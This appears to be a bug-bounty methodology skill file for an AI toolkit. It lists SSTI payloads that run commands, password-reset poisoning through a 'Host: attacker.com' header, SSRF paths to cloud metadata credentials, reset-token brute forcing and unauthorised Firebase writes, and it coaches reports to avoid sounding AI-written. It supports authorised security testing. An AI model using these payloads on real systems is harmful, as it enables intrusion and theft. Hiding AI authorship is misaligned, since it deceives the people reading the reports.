## SSTI -- Server-Side Template Injection

### Detection Payloads
```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### Where to Test
- Name/bio/description fields (profile pages)
- Email templates (invoice name, username in confirmation email)
- Custom error messages
- PDF generators (invoice, report export)
- URL path parameters
- Search queries reflected in results

### Jinja2 -> RCE (Python / Flask)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig -> RCE (PHP / Symfony)
```php
{{["id"]|filter("system")}}
```

### Freemarker -> RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB -> RCE (Ruby on Rails)
```ruby
<%= `id` %>
```

## Subdomain Takeover

### Detection
```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME" | tee /tmp/cnames.txt
# Look for CNAMEs to: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com

# Automated takeover detection
nuclei -l /tmp/subs.txt -t ~/nuclei-templates/takeovers/ -o /tmp/takeovers.txt
```

### Quick-Kill Fingerprints
```
"There isn't a GitHub Pages site here"  -> GitHub Pages
"NoSuchBucket"                          -> AWS S3
"No such app"                           -> Heroku
"404 Web Site not found"                -> Azure App Service
"Fastly error: unknown domain"          -> Fastly CDN
"project not found"                     -> GitLab Pages
"It looks like you may have typed..."   -> Shopify
```

### Impact Escalation
- Basic takeover: serve page under target.com subdomain -> Low/Medium
- + Cookies: if target.com sets cookie with domain=.target.com -> credential theft -> High
- + OAuth redirect: if sub.target.com is a registered redirect_uri -> ATO chain -> Critical
- + CSP bypass: if sub.target.com is in target's CSP -> XSS anywhere -> Critical

## ATO -- Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)
```bash
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=<EMAIL-REDACTED>
# If reset link = https://attacker.com/reset?token=XXXX -> ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak
After clicking reset link, if page loads external resources -> token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens
```bash
# If token < 16 hex chars or numeric only -> brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring / Reuse
Request token -> wait 2 hours -> use it -> still works? Request token #1 -> request token #2 -> use token #1 -> still works?

### Path 5: Email Change Without Re-Authentication
```bash
PUT /api/user/email
{"new_email": "<EMAIL-REDACTED>"}
# If no current_password required -> attacker changes email -> locks out victim
```

### Path 6: OAuth Account Linking Abuse
Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation
GET /login -> note Set-Cookie session=XYZ -> Log in -> does session ID change? If not = fixation.

## Cloud / Infra Misconfigs

### S3 / GCS / Azure Blob
```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common names
for name in target target-backup target-assets target-prod target-staging target-uploads target-data; do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

### EC2 Metadata (via SSRF)
```bash
http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/
# Returns role name, then:
http://[REDACTED_IP]/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns AccessKeyId, SecretAccessKey, Token -> Critical

# GCP (needs header Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (needs header Metadata: true):
http://[REDACTED_IP]/metadata/instance?api-version=2021-02-01
```

### Firebase Open Rules
```bash
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-APP.firebaseio.com/.json"
# If data returned -> open read
curl --max-time 30 --connect-timeout 10 -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
# If success -> open write -> Critical
```

### Exposed Admin Panels
```bash
/jenkins       /grafana       /kibana        /elasticsearch
/swagger-ui.html  /api-docs   /phpMyAdmin    /adminer.php
/.env          /config.json   /server-status /actuator/env
```

### Kubernetes / Docker
```bash
# K8s API (unauthenticated):
curl --max-time 30 --connect-timeout 10 -sk https://TARGET:6443/api/v1/namespaces/default/pods
# Docker API:
curl --max-time 30 --connect-timeout 10 -s http://TARGET:2375/containers/json
```

# PHASE 4: VALIDATE

## The 7-Question Gate (Run BEFORE Writing ANY Report)

All 7 must be YES. Any NO -> STOP.

### Q1: Can I exploit this RIGHT NOW with a real PoC?
Write the exact HTTP request. If you cannot produce a working request -> KILL IT.

### Q2: Does it affect a REAL user who took NO unusual actions?
No "the user would need to..." with 5 preconditions. Victim did nothing special.

### Q3: Is the impact concrete (money, PII, ATO, RCE)?
"Technically possible" is not impact. "I read victim's SSN" is impact.

### Q4: Is this in scope per the program policy?
Check the exact domain/endpoint against the program's scope page.

### Q5: Did I check Hacktivity/changelog for duplicates?
Search the program's disclosed reports and recent changelog entries.

### Q6: Is this NOT on the "always rejected" list?
Check the list below. If it's there and you can't chain it -> KILL IT.

### Q7: Would a triager reading this say "yes, that's a real bug"?
Read your report as if you're a tired triager at 5pm on a Friday. Does it pass?

## Pitfalls

- **Over-automation without understanding** — running nuclei, ffuf, and dalfox on every subdomain triggers WAF blocks, rate limits, and IP bans. Use `-rate` and `-t` flags. Manual probing finds bugs that automated scanners miss.
- **5-Minute Rule violations** — lingering on a target returning only 401/403/404 wastes time. MOVE ON after 5 minutes of nothing.
- **"Could" is not a bug** — theoretical attacks without demonstrated impact get rejected. Prove it works or drop it. Every finding must show actual harm: stolen funds, leaked PII, account takeover, or code execution.
- **Source maps without secrets** — finding `.map` files is reconnaissance-grade, not a vulnerability. Only report when paired with extracted credentials or API keys.
- **SSRF with DNS-only callback** — DNS pingbacks alone don't prove impact. Need data exfiltration, internal service access, or cloud metadata retrieval.
- **Open redirect alone** — without an OAuth chain or ATO escalation path, this is informational at best. Build the full chain before reporting.
- **Spraying without method** — jumping between XSS, IDOR, SSRF, and cache poisoning in one session guarantees shallow findings. Pick ONE bug class per session and go deep.
- **Over-reliance on one wordlist** — SecLists is a starting point, not the destination. Asset-specific wordlists (from JS files, API responses, swagger docs) outperform generic ones.
- **Ignoring mobile API versions** — mobile apps often use different/v1 endpoints with lower auth maturity than web counterparts.
- **New features == unreviewed** — anything launched in the last 30 days has the lowest security maturity and highest bug density.
- **Not reading disclosed reports first** — spending hours hunting a class that's out of scope or already hard-mitigated wastes time. Read 3+ disclosed reports before hunting.
- **Scope creep via subdomain enumeration** — verify every subdomain is owned by the target. Third-party services (Zendesk, Shopify, statuspage.io) are typically out of scope.
- **Report-first, validate-later** — writing the report before confirming the bug still works at time of submission. Always re-test minutes before submitting.
- **Screenshot-only evidence** — HTTP request + response + screenshot is the minimum. Request-only or screenshot-only gets rejected by triagers.
- **One test account testing itself** — IDOR/ATO bugs need two accounts (attacker + victim). Testing with one account against itself proves nothing.

## 4 Pre-Submission Gates

### Gate 0: Reality Check (30 seconds)
```
[ ] The bug is real -- confirmed with actual HTTP requests, not just code reading
[ ] The bug is in scope -- checked program scope explicitly
[ ] I can reproduce it from scratch (not just once)
[ ] I have evidence (screenshot, response, video)
```

### Gate 1: Impact Validation (2 minutes)
```
[ ] I can answer: "What can an attacker DO that they couldn't before?"
[ ] The answer is more than "see non-sensitive data"
[ ] There's a real victim: another user's data, company's data, financial loss
[ ] I'm not relying on the user doing something unlikely
```

### Gate 2: Deduplication Check (5 minutes)
```
[ ] Searched HackerOne Hacktivity for this program + similar bug title
[ ] Searched GitHub issues for target repo
[ ] Read the most recent 5 disclosed reports for this program
[ ] This is not a "known issue" in their changelog or public docs
```

### Gate 3: Report Quality (10 minutes)
```
[ ] Title: One sentence, contains vuln class + location + impact
[ ] Steps to reproduce: Copy-pasteable HTTP request
[ ] Evidence: Screenshot/video showing actual impact (not just 200 response)
[ ] Severity: Matches CVSS 3.1 score AND program's severity definitions
[ ] Remediation: 1-2 sentences of concrete fix
```

## CVSS 3.1 Quick Guide

| Factor | Low (0-3.9) | Medium (4-6.9) | High (7-8.9) | Critical (9-10) |
|--------|-------------|----------------|--------------|-----------------|
| Attack Vector | Physical | Local | Adjacent | Network |
| Privileges | High | Low | None | None |
| User Interaction | Required | Required | None | None |
| Impact | Partial | Partial | High | High (all 3) |

### Typical Scores by Bug Class

| Bug | Typical CVSS | Severity |
|----|------|---------|
| IDOR (read PII) | 6.5 | Medium |
| IDOR (write/delete) | 7.5 | High |
| Auth bypass -> admin | 9.8 | Critical |
| Stored XSS | 5.4-8.8 | Med-High |
| SQLi (data exfil) | 8.6 | High |
| SSRF (cloud metadata) | 9.1 | Critical |
| Race condition (double spend) | 7.5 | High |
| GraphQL auth bypass | 8.7 | High |
| JWT none algorithm | 9.1 | Critical |

# ALWAYS REJECTED -- Never Submit These

Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection alone, banner/version disclosure without working CVE exploit, clickjacking on non-sensitive pages, tabnabbing, CSV injection, CORS wildcard without credential exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret in mobile app, SSRF DNS-ping only, host header injection alone, no rate limit on non-critical forms, session not invalidated on logout, concurrent sessions, internal IP disclosure, mixed content, SSL weak ciphers, missing HttpOnly/Secure cookie flags alone, broken external links, pre-account takeover (usually), autocomplete on password fields.

**N/A hurts your validity ratio. Informative is neutral. Only submit what passes the 7-Question Gate.**

## Conditionally Valid With Chain

These low findings become valid bugs when chained:

| Low Finding | + Chain | = Valid Bug |
|------------|---------|-------------|
| Open redirect | + OAuth code theft | ATO |
| Clickjacking | + sensitive action + PoC | Account action |
| CORS wildcard | + credentialed exfil | Data theft |
| CSRF | + sensitive state change | Account takeover |
| No rate limit | + OTP brute force | ATO |
| SSRF (DNS only) | + internal access proof | Internal network access |
| Host header injection | + password reset poisoning | ATO |
| Self-XSS | + login CSRF | Stored XSS on victim |

# PHASE 5: REPORT

## HackerOne Report Template

```
Title: [Vuln Class] in [endpoint/feature] leads to [Impact]

## Summary
[2-3 sentences: what it is, where it is, what attacker can do]

## Steps To Reproduce
1. Log in as attacker (account A)
2. Send request: [paste exact request]
3. Observe: [exact response showing the bug]
4. Confirm: [what the attacker gained]

## Supporting Material
[Screenshot / video of exploitation]
[Burp Suite request/response]

## Impact
An attacker can [specific action] resulting in [specific harm].
[Quantify if possible: "This affects all X users" or "Attacker can access Y data"]

## Severity Assessment
CVSS 3.1 Score: X.X ([Severity label])
Attack Vector: Network | Complexity: Low | Privileges: None | User Interaction: None
```

## Bugcrowd Report Template

```
Title: [Vuln] at [endpoint] -- [Impact in one line]

Bug Type: [IDOR/SSRF/XSS/etc]
Target: [URL or component]
Severity: [P1/P2/P3/P4]

Description:
[Root cause + exact location]

Reproduction:
1. [step]
2. [step]
3. [step]

Impact:
[Concrete business impact]

Fix Suggestion:
[Specific remediation]
```

## Human Tone Rules (Avoid AI-Sounding Writing)
- Start sentences with the impact, not the vulnerability name
- Write like you're explaining to a smart developer, not a textbook
- Use "I" and active voice: "I found that..." not "A vulnerability was discovered..."
- One concrete example beats three abstract sentences
- No em dashes, no "comprehensive/leverage/seamless/ensure"

## Report Title Formula

```
[Bug Class] in [Exact Endpoint/Feature] allows [attacker role] to [impact] [victim scope]
```

**Good titles:**
```
IDOR in /api/v2/invoices/{id} allows authenticated user to read any customer's invoice data
Missing auth on POST /api/admin/users allows unauthenticated attacker to create admin accounts
Stored XSS in profile bio field executes in admin panel -- allows privilege escalation
SSRF via image import URL parameter reaches AWS EC2 metadata service
Race condition in coupon redemption allows same code to be used unlimited times
```

**Bad titles:**
```
IDOR vulnerability found
Broken access control
XSS in user input
Security issue in API
```

## Impact Statement Formula (First Paragraph)

```
An [attacker with X access level] can [exact action] by [method], resulting in [business harm].
This requires [prerequisites] and leaves [detection/reversibility].
```

## The 60-Second Pre-Submit Checklist

```
[ ] Title follows formula: [Class] in [endpoint] allows [actor] to [impact]
[ ] First sentence states exact impact in plain English
[ ] Steps to Reproduce has exact HTTP request (copy-paste ready)
[ ] Response showing the bug is included (screenshot or response body)
[ ] Two test accounts used (not just one account testing itself)
[ ] CVSS score calculated and included
[ ] Recommended fix is one sentence (not a lecture)
[ ] No typos in the endpoint path or parameter names
[ ] Report is < 600 words (triagers skim long reports)
[ ] Severity claimed matches impact described (don't overclaim)
```

## Severity Escalation Language

When payout is being downgraded, use these counters:

| Program Says | You Counter With |
|---|---|
| "Requires authentication" | "Attacker needs only a free account (no special role)" |
| "Limited impact" | "Affects [N] users / [PII type] / [$ amount]" |
| "Already known" | "Show me the report number -- I searched and found none" |
| "By design" | "Show me the documentation that states this is intended" |
| "Low CVSS score" | "CVSS doesn't account for business impact -- attacker can steal [X]" |

## Verification

Run this self-test to confirm the toolkit is operational:

1. **Core tool check** — verify essential Go binaries and Python tools are installed:
   ```bash
   which subfinder httpx nuclei katana ffuf dalfox gau waybackurls 2>/dev/null
   pip3 show arjun paramspider 2>/dev/null | grep -E '^Name:|^Version:'
   ```

2. **FFUF calibration test** — confirm `-ac` auto-calibrate works:
   ```bash
   ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://example.com/FUZZ -ac -timeout 5 2>&1 | head -5
   ```

3. **Subfinder connectivity** — verify passive sources are reachable:
   ```bash
   subfinder -d example.com -silent -timeout 30 2>&1 | head -3
   ```

4. **HackerOne API reachability** — confirm GraphQL endpoint is accessible:
   ```bash
   curl --max-time 30 --connect-timeout 10 -s "https://hackerone.com/graphql" -o /dev/null -w "%{http_code}" && echo " PASS" || echo " FAIL"
   ```

5. **Semgrep install check** — confirm static analysis is available:
   ```bash
   semgrep --version >/dev/null 2>&1 && echo "PASS: semgrep available" || echo "FAIL: pip3 install semgrep"
   ```

6. **Wordlist availability** — confirm SecLists is cloned:
   ```bash
   ls /usr/share/seclists/Discovery/Web-Content/common.txt >/dev/null 2>&1 && echo "PASS: SecLists present" || echo "FAIL: git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists"
   ```

All 6 tests should pass for a fully operational toolkit. Missing Go binaries can be installed via `go install`; Python tools via `pip3 install`.

## Related Skills & Chains

- **`bug-bounty`** — When the user wants general bug-bounty guidance rather than command-line location. Workflow primitive: `bug-bounty` is the orchestrator and routes to topic-matched hunt-* skills; this skill (`bb-local-toolkit`) answers "where is the command-line / wordlist / clone on disk for that hunt?"
- **`web2-recon`** — When recon needs to be run via specific command-line invocations. Workflow primitive: this skill names the local install path (e.g., `~/tools/SecretFinder/.venv/bin/activate`); `web2-recon` is the pipeline that strings those command-line paths together.
- **`offensive-osint`** — When the operational arsenal (probes, regexes, wordlists) needs a command-line to execute it. Workflow primitive: `offensive-osint` provides the regex / probe; this skill provides the local trufflehog / jhaddix / SecLists clone that runs it.
- **`security-arsenal`** — When the payload library needs a command-line to fire payloads at scale. Workflow primitive: `security-arsenal` is the payload syntax; this skill names the ffuf / dalfox / ghauri install that delivers them.
- **`bb-methodology`** — When Phase 1 (Recon) or Phase 3 (Discovery) needs command-lineing routed. Workflow primitive: `bb-methodology`'s "Tool Routing by Phase" table is general; this skill resolves the abstract command-line names to concrete local paths.
